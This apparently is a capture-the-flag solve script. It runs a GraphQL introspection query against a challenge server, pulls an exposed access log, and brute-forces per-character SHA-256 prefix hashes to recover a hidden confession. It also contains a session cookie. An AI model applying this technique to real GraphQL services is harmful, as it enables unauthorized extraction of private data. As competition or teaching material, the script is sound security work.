

import requests


data = '''
{"operationName":"IntrospectionQuery","variables":{},"query":"query IntrospectionQuery {   __schema {     queryType {       name     }     mutationType {       name     }     subscriptionType {       name     }     types {       ...FullType     }     directives {       name       description       locations       args {         ...InputValue       }     }   } }  fragment FullType on __Type {   kind   name   description   fields(includeDeprecated: true) {     name     description     args {       ...InputValue     }     type {       ...TypeRef     }     isDeprecated     deprecationReason   }   inputFields {     ...InputValue   }   interfaces {     ...TypeRef   }   enumValues(includeDeprecated: true) {     name     description     isDeprecated     deprecationReason   }   possibleTypes {     ...TypeRef   } }  fragment InputValue on __InputValue {   name   description   type {     ...TypeRef   }   defaultValue }  fragment TypeRef on __Type {   kind   name   ofType {     kind     name     ofType {       kind       name       ofType {         kind         name         ofType {           kind           name           ofType {             kind             name             ofType {               kind               name               ofType {                 kind                 name               }             }           }         }       }     }   } } "}
'''

data = '''
{"operationName":null,"variables":{},"query":"{  accessLog { name, timestamp, args  }}"}
'''



def query():
    url = 'https://confessions.flu.xxx/graphql'
    headers = {
        "content-type": "application/json"
    }

    cookies = {'session': 's%3AiIsWNRX0dBB3l_CAxwKu5uw9alVDKnal.aWmKc%2FnijFtCD91fSfm42ze5CczAEfPAZ3sy7danCGg'}
    cookies = {}

    resp = requests.post(url,headers=headers,cookies=cookies,data=data)
    print(resp.text)


import json

f = open("./result.json")
data = f.read()
f.close()


import hashlib
import string
def get_answer(prefix, hash):
    for ch in string.printable:
        m = hashlib.sha256()
        m.update(prefix.encode() + ch.encode())
        if hash ==m.hexdigest():
            return ch
    print("wrong!")
    exit()

answer = ""
root = json.loads(data)
logs = root["data"]["accessLog"]
for log in logs:
    name = log["name"]
    if name == "confession":
        #print('log["args"]:',log["args"])
        hash = json.loads(log["args"])["hash"]
        answer += get_answer(answer,hash)
        print(answer)
    
